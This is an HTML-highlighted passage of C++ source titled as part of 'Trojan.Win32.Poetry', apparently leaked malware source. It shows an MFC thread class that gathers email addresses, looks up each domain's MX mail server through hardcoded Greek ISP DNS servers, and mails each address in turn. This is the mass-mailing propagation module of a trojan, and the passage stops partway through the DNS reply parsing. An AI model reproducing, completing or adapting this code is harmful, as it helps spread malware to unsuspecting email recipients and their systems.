<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Trojan.Win32.Poetry - SendMessage.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">// SendMessage.cpp : implementation file
//
</span><span class="sc0">
</span><span class="sc9">#include "stdafx.h"
#include "SendMessage.h"
#include "PoetryApp.h"
#include "MainFrm.h"
#include "DNSResolverLibrary/nameser.h"
#include "DNSResolverLibrary/resolv.h"
</span><span class="sc0">
</span><span class="sc9">#include "smtp\smtp.h"
#include "smtp\MIMEMessage.h"
</span><span class="sc0">

</span><span class="sc9">#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">THIS_FILE</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">__FILE__</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
</span><span class="sc2">/////////////////////////////////////////////////////////////////////////////
// CSendMessage
</span><span class="sc0">
</span><span class="sc11">IMPLEMENT_DYNCREATE</span><span class="sc10">(</span><span class="sc11">CSendMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CWinThread</span><span class="sc10">)</span><span class="sc0">

</span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">CSendMessage</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">CSendMessage</span><span class="sc10">::~</span><span class="sc11">CSendMessage</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">InitInstance</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// TODO:  perform and per-thread initialization here
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">ExitInstance</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// TODO:  perform any per-thread cleanup here
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">CWinThread</span><span class="sc10">::</span><span class="sc11">ExitInstance</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">BEGIN_MESSAGE_MAP</span><span class="sc10">(</span><span class="sc11">CSendMessage</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CWinThread</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc2">//{{AFX_MSG_MAP(CSendMessage)
</span><span class="sc0">    </span><span class="sc2">//}}AFX_MSG_MAP
</span><span class="sc11">END_MESSAGE_MAP</span><span class="sc10">()</span><span class="sc0">

</span><span class="sc2">/////////////////////////////////////////////////////////////////////////////
// CSendMessage message handlers
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">AddEmail</span><span class="sc10">(</span><span class="sc11">CEmailAdr</span><span class="sc0"> </span><span class="sc11">Email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">   
    </span><span class="sc2">//_asm {
</span><span class="sc0">    </span><span class="sc2">//int 3;
</span><span class="sc0">    </span><span class="sc2">//}
</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">m_Emails</span><span class="sc10">.</span><span class="sc11">GetSize</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">s</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">m_Emails</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc11">Email</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">m_Emails</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">Email</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc2">//... 
</span><span class="sc0">    </span><span class="sc2">//PostThreadMessage(WUM_EMAILADDED,0,0);
</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">OnEmailAdded</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//Check for unsent messages.
</span><span class="sc0">    </span><span class="sc2">//quit if none found
</span><span class="sc0">    </span><span class="sc2">//if(m_Emails.GetSize()==0) return;
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">m_Emails</span><span class="sc10">.</span><span class="sc11">GetSize</span><span class="sc10">();</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">m_Emails</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">m_Posted</span><span class="sc10">==</span><span class="sc5">false</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">CEmailAdr</span><span class="sc0"> </span><span class="sc11">Mail</span><span class="sc10">=</span><span class="sc11">m_Emails</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    
            </span><span class="sc2">//Use DNS lookup to get the mail server of this Email   
</span><span class="sc0">            </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">mailservers</span><span class="sc10">;</span><span class="sc0">    
            </span><span class="sc2">//ns1.otenet.gr  195.170.0.2
</span><span class="sc0">            </span><span class="sc2">//ns2.otenet.gr  195.170.0.1
</span><span class="sc0">            </span><span class="sc2">//ns1.hol.gr  194.30.220.119
</span><span class="sc0">            </span><span class="sc2">//teiresias.forthnet.gr 194.219.227.2
</span><span class="sc0">
            </span><span class="sc11">GetSMTPServer</span><span class="sc10">(</span><span class="sc6">"195.170.0.2,194.30.220.119,194.219.227.2"</span><span class="sc10">,</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">,</span><span class="sc11">mailservers</span><span class="sc10">);</span><span class="sc0">
    
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mailservers</span><span class="sc10">==</span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc11">mailservers</span><span class="sc10">=</span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_Domain</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mailservers</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc7">','</span><span class="sc10">)!=-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">mailservers</span><span class="sc10">=</span><span class="sc11">mailservers</span><span class="sc10">.</span><span class="sc11">Mid</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">mailservers</span><span class="sc10">.</span><span class="sc11">Find</span><span class="sc10">(</span><span class="sc7">','</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">Mail</span><span class="sc10">.</span><span class="sc11">m_MailServer</span><span class="sc10">=</span><span class="sc11">mailservers</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">Mail</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">m_Emails</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">m_Posted</span><span class="sc10">=</span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
            
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">CSendMessage</span><span class="sc10">::</span><span class="sc11">GetSMTPServer</span><span class="sc10">(</span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">DNSAddress</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">DomainName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">SMTPAddress</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//Resolve(BDomainName, &amp;vFoundNames, _bstr_t("C_IN"), _bstr_t("T_MX"));
</span><span class="sc0">    </span><span class="sc2">//Resolve(BSTR BSearchedName, VARIANT *pvFoundNames, BSTR BResourceClass, BSTR BResourceType)
</span><span class="sc0">        
    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">hReturnCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// Failure
</span><span class="sc0">    </span><span class="sc16">union</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc11">hdr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc11">PACKETSZ</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">oDNSAnswer</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nDNSAnswerLength</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nResourceClass</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nResourceType</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szSearchedName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">m_szServerAddresses</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Convert parameters and init output
</span><span class="sc0">    </span><span class="sc11">nResourceClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">C_IN</span><span class="sc10">;</span><span class="sc0">    
    </span><span class="sc11">nResourceType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">T_MX</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">szSearchedName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">DomainName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szSearchedName</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">    

    </span><span class="sc11">m_szServerAddresses</span><span class="sc10">=</span><span class="sc11">DNSAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">m_szServerAddresses</span><span class="sc10">==</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    

    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bNoServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CStringList</span><span class="sc0"> </span><span class="sc11">oServerList</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szServerAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">res_init</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">BuildListFromString</span><span class="sc10">(</span><span class="sc11">m_szServerAddresses</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">oServerList</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">POSITION</span><span class="sc0"> </span><span class="sc11">pServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oServerList</span><span class="sc10">.</span><span class="sc11">GetHeadPosition</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pServer</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">szServerAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oServerList</span><span class="sc10">.</span><span class="sc11">GetNext</span><span class="sc10">(</span><span class="sc11">pServer</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">// Convert dotted notation into address
</span><span class="sc0">        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">inet_aton</span><span class="sc10">(</span><span class="sc11">szServerAddress</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">addr</span><span class="sc10">))</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Store it in configuration (memory)
</span><span class="sc0">            </span><span class="sc11">res_addnameserver</span><span class="sc10">(&amp;</span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">bNoServer</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bNoServer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CString</span><span class="sc0"> </span><span class="sc11">szErrorMessage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Invalid DNS server addresses \""</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">szErrorMessage</span><span class="sc10">+=</span><span class="sc11">m_szServerAddresses</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc2">// Send query to DNS Server and fetch reply
</span><span class="sc0">    </span><span class="sc11">nDNSAnswerLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">res_search</span><span class="sc10">(</span><span class="sc11">szSearchedName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nResourceClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">oDNSAnswer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nDNSAnswerLength</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetLastError</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ERROR_UNEXP_NET_ERR</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc2">//SetError("DNS Resolution failure: ", dwLastError);
</span><span class="sc0">        </span><span class="sc11">hReturnCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HRESULT_FROM_WIN32</span><span class="sc10">(</span><span class="sc11">dwLastError</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">hdr</span><span class="sc10">.</span><span class="sc11">rcode</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">NOERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetLastError</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">dwLastError</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ERROR_UNEXP_NET_ERR</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc2">//SetError("DNS Resolution failure: ", dwLastError);
</span><span class="sc0">            </span><span class="sc11">hReturnCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HRESULT_FROM_WIN32</span><span class="sc10">(</span><span class="sc11">dwLastError</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc2">// Set pointers for parsing answers
</span><span class="sc0">            </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">HFIXEDSZ</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pEndOfMessage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">nDNSAnswerLength</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">// Number of answers
</span><span class="sc0">            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nAnswers</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ntohs</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">hdr</span><span class="sc10">.</span><span class="sc11">ancount</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">TRACE1</span><span class="sc10">(</span><span class="sc6">"Number of answers = %d\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nAnswers</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Authoritative answer
</span><span class="sc0">            </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">bAuthoritative</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">hdr</span><span class="sc10">.</span><span class="sc11">aa</span><span class="sc10">?</span><span class="sc11">TRUE</span><span class="sc10">:</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Skip the question section
</span><span class="sc0">            </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">SkipName</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">QFIXEDSZ</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc2">// Extract Data (and skip it)
</span><span class="sc0">            </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc11">nClass</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">u_int32_t</span><span class="sc0"> </span><span class="sc11">nTimeToLive</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">u_short</span><span class="sc0"> </span><span class="sc11">nDataLength</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc11">inaddr</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">u_char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pCurrentData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">cp</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">SkipData</span><span class="sc10">(</span><span class="sc11">oDNSAnswer</span><span class="sc10">.</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nClass</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nTimeToLive</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nDataLength</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pEndOfMessage</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nAnswers</span><span class="sc10">--&gt;=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">&lt;</span><span class="sc11">pEndOfMessage</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">pCurrentData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">cp</span><span class="sc10">;</span><span class="sc0">

                </span><span class="sc2">// Check of type of data is the requested type: if yes, process it (otherwise: ignore it)
</span><span class="sc0">                </span><span class="sc11">TRACE1</span><span class="sc10">(</span><span class="sc6">"RR Type %d...\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">);</span><span class="sc0">

                </span><span class="sc2">// Get type specific data, if appropriate
</span><span class="sc0">                
                </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nType</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">T_A</span><span class="sc10">:</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// IPv4 address
</span><span class="sc0">                        </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nClass</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">C_IN</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">C_HS</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc11">bcopy</span><span class="sc10">(</span><span class="sc11">pCurrentData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">inaddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">INADDRSZ</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nDataLength</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"internet address = %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">inaddr</span><span class="sc10">));</span><span class="sc0">

                                </span><span class="sc11">AppendResult</span><span class="sc10">(</span><span class="sc11">nResourceType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">inaddr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">szFoundNames</span><span class="sc10">);</span><span class="sc0">

                            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nDataLength</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">7</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">"\tinternet address = %s"</span><span class="sc10">,</span><span class="sc0">
                                    </span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">inaddr</span><span class="sc10">));</span><span class="sc0">
                                </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">", protocol = %d"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]);</span><span class="sc0">
                                </span><span class="sc11">TRACE</span><span class="sc10">(</span><span class="sc6">", port = %d\n"</span><span class="sc10">,</span><span class="sc0">
                                    </span><span class="sc10">(</span><span class="sc11">pCurrentData</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">pCurrentData</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]);</span><span class="sc0">

